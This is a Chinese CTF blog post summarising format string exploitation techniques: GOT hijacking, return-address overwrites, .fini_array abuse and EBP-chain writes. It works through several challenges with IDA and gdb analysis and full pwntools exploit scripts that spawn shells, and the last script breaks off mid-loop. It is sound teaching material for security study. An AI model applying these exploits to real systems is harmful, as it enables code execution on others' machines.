<!DOCTYPE html>
<html lang="zh-CN">





<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content>
  <meta name="author" content="chumen77">
  <meta name="keywords" content>
  <title>格式化字符串漏洞小总结（下） ~ Chumen77&#39;s Blog</title>

  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">


</head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Chumen77's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" false
         style="background: url('/img/default.png')no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              <br>
              
                <p class="mt-3">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
                  星期五, 四月 3日 2020, 4:59 下午
                </p>
              

              <p>
                
                  
                  &nbsp;<i class="far fa-chart-bar"></i>
                  <span class="post-count">
                    5.1k 字
                  </span>&nbsp;
                

                
                  
                  &nbsp;<i class="far fa-clock"></i>
                  <span class="post-count">
                      22 分钟
                  </span>&nbsp;
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
                  <span id="busuanzi_container_page_pv">
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>&nbsp;
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="py-5 z-depth-3" id="board">
        <div class="post-content mx-auto" id="post">
          <div class="markdown-body">
            <h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p>
<h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul>
<li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li>
<li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li>
<li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li>
<li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li>
<li>在栈上构造出printf函数GOT表的地址</li>
<li>利用fmt漏洞修改printf函数GOT表上的地址</li>
</ul>
<p>然后看一个例题：</p>
<h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+Ch] [ebp-10Ch]
  unsigned int v4; // [esp+10Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  do
  {
    fgets(&amp;s, 256, stdin);
    printf(&amp;s);
  }
  while ( strcmp(&amp;s, &quot;exit\n&quot;) );
  system(&quot;echo Goodbye&quot;);
  exit(0);
}</code></pre>
<p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p>
<h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul>
<li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li>
<li>改这个GOT上的地址为system函数的plt</li>
<li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li>
</ul>
<p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p>
<h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><pre><code>gdb-peda$ stack 0x20
0000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)
0004| 0xffffd254 --&gt; 0x100
0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b
0012| 0xffffd25c --&gt; 0x0
0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40
0020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)
0024| 0xffffd268 --&gt; 0xf63d4e2e
0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26c
The index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
# io = process(&#39;./echo&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,26990)
system_plt = 0x08048400
printf_got = 0x0804A010

def fmt_short(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result

prev = 0 
payload = &quot;&quot;
key = 0x08048400
for i in range(2):
    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) 
    prev = (key &gt;&gt; i*16) &amp; 0xffff

payload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.send(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p>
<pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
# io = process(&#39;./echo&#39;)
io = remote(&#39;node3.buuoj.cn&#39;,26990)
system_plt = 0x08048400
printf_got = 0x0804A010
payload = fmtstr_payload(7,{printf_got : system_plt})
io.sendline(payload)
io.send(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p>
<h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p>
<ul>
<li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li>
<li>不开nx保护，jmp到自己构造的shellcode上。</li>
<li>提前泄漏libc算出libc的base，jmp到onegadget地址</li>
</ul>
<p>看一个简单的例子：</p>
<h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)</code></pre><p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p>
<h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p>
<pre><code class="c">
int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9)
{
  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);
  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);
  return printf(&amp;a9 + 4);
}
</code></pre>
<p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p>
<p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p>
<p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p>
<h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p>
<p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p>
<p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p>
<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch = &#39;amd64&#39;
io = process(&#39;./pwnme_k0&#39;)
# context.clear(arch = &#39;amd64&#39;)
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(&#39;%0006$lx&#39;)
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(&#39;11111111&#39;)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;1&#39;)
# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)
stack = int(io.recvline_contains(&#39;7f&#39;),16)
print(stack)
ret_add = stack - 0x38
# system_add = 0x04008AA
payload = &#39;%2218c%8$hn&#39;
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;2&#39;)
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(p64(ret_add))
io.recvuntil(&#39;lenth:20): \n&#39;)
io.sendline(payload)
io.recvuntil(&#39;&gt;&#39;)
io.sendline(&#39;1&#39;)
io.interactive()</code></pre>
<h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p>
<p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p>
<h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf(&quot;Please tell me your name... &quot;);
  if ( !getnline(&amp;v5, 64) )
    return puts(&quot;Don&#39;t ignore me ;( &quot;);
  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);
  return printf(&amp;s);
}</code></pre>
<p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p>
<pre><code class="c">size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [esp+1Ch] [ebp-Ch]

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}</code></pre>
<p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p>
<ul>
<li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li>
<li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li>
<li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li>
</ul>
<p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p>
<h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p>
<pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre>
<p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *
context.arch = &#39;i386&#39;
context.log_level = &#39;debug&#39;
io = process(&#39;./greeting&#39;)
# io = remote(&#39;111.198.29.45&#39;,42729)
elf = ELF(&#39;./greeting&#39;)
strlen_got = 0x08049A54
fini_array = 0x08049934
start = 0x080484F0
system_plt = 0x08048490
offset = 12
def fmt_short(prev,val,idx,byte = 2):
    result = &quot;&quot;
    if prev &lt; val :
        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;
    elif prev == val :
        result += &#39;&#39;
    else :
        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;
    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;
    return result
key1 = 0x08048490
prev = 18 #注意这个题在可控格式化字符串前有字符输出
payload = &quot;&quot;
for i in range(2):
    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i) 
    prev = (key1 &gt;&gt; i*16) &amp; 0xffff
key2 = 0x84F0
for i in range(1):
    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i) 
    prev = (key2 &gt;&gt; i*16) &amp; 0xffff
payload = payload.ljust(0x32,&#39;a&#39;)
payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)
io.recvuntil(&#39;name...&#39;)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recvuntil(&#39;name...&#39;)
io.sendline(&#39;/bin/sh\x00&#39;)
io.interactive()</code></pre>
<h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p>
<h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p>
<ul>
<li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li>
<li>sprintf：可以用%xxc 来造成新的buffer overflow </li>
</ul>
<h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul>
<li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li>
<li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li>
</ul>
<h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p>
<h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p>
<p>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p>
<ul>
<li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li>
<li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li>
</ul>
<p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p>
<p>接下来看一个题来仔细分析一下</p>
<h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p>
<h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int do_fmt()
{
  int result; // eax

  while ( 1 )
  {
    read(0, buf, 0xC8u);
    result = strncmp(buf, &quot;quit&quot;, 4u);
    if ( !result )
      break;
    printf(buf);
  }
  return result;
}</code></pre>
<p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p>
<p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p>
<p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p>
<h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p>
<pre><code>gdb-peda$ b *0x0804854F
Breakpoint 1 at 0x804854f</code></pre><p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p>
<p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p>
<p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p>
<p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p>
<p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
import time
context.log_level = &#39;debug&#39;
context.arch = &#39;i386&#39;
io = process(&#39;./ebp&#39;)
# io = remote(&#39;node3.buuoj.cn&#39;,29994)
buf = 0x0804a080 + 0x40 #0x804a0c0
raw_input(&#39;-&gt;&#39;)
io.sendline(&#39;%4$p&#39;)
ret_stack_addr = int(io.recv(10),16) - 28
print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))
key1 = int(str(hex(ret_stack_addr))[-2:],16)
key2 = 0xa0c0
payload = &#39;%{}c%4$hhn&#39;.format(key1)
raw_input(&#39;-&gt;&#39;)
io.sendline(payload)
io.recv()
payload = &#39;%{}c%12$hn&#39;.format(key2)
payload = payload.ljust(0x40) 
payload +=  asm(shellcraft.sh())
io.sendline(payload)
io.interactive()</code></pre>
<p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p>
<p>然后再看一个有点不一样的题目：</p>
<h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><pre><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre><h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p>
<p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p>
<pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )
  {
    read(0, buff, 0x1000u);
    printf(buff);
  }</code></pre>
<p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p>
<h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p>
<p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p>
<p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p>
<ul>
<li>泄漏libc基址，计算出system的内存地址。</li>
<li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li>
<li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li>
</ul>
<p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p>
<p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p>
<p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p>
<pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54
gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p>
<p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p>
<p>接着就可以构造got地址和got+2地址：</p>
<pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016
gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p>
<p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p>
<pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p>
<h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><pre><code class="python">from pwn import *
context.log_level = &#39;debug&#39;
context.arch =&#39;i386&#39;
import time
elf = ELF(&#39;./echo3&#39;)
debug = 1
while True:
    if debug :
        io = process(&#39;./echo3&#39;)
        libc = elf.libc
    else:
        io = remote(&#39;node3.buuoj.cn&#39;,25057)
        libc = ELF(&#39;./libc-2.23.so.i386&#39;)
    payload = &#39;%43$pA%30$pA%47$p&#39;
    io.sendline(payload)
    address = io.recvline().strip()
    if address[-3:] == &#39;637&#39;:
        if address[7:10] == &#39;637&#39;:
            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]
            tag1_stack_point = int(address[13:21],16) - 0x118
            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8
            system_addr = libc_base + libc.symbols[&#39;system&#39;]
            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))
            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))
